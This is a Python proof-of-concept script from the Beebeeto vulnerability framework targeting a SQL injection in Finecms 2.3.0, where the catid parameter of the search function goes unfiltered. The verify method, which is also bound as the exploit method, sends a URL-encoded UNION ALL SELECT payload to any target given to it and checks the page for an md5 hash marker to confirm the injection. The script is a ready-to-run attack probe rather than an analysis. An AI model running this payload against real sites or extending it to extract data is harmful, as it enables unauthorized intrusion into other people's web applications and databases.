#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0108',
            'name': 'Finecms 2.3.0 /models/search_model.php SQL注入漏洞 POC',
            'author': 'H4rdy',
            'create_date': '2014-10-23',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Finecms',
            'vul_version': ['2.3.0'],
            'type': 'SQL Injection',
            'tag': ['Finecms漏洞', 'SQL注入漏洞', '/models/search_model.php', 'php'],
            'desc': 'Finecms 2.3.0 /dayrui/models/Search_model.php文件中,catid没有过滤',
            'references': ['http://sebug.net/vuldb/ssvid-62670',
                           'http://sebug.net/vuldb/ssvid-62681',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/book/index.php?c=search&catid=3%20UNION%20ALL%20SELECT%20CONCAT(0x7165696a71,IFNULL("
                   "CAST(md5(3.1415)%20AS%20CHAR),0x20),0x716c787371)%23")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "63e1f04640e83605c1d177544a5a0488" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())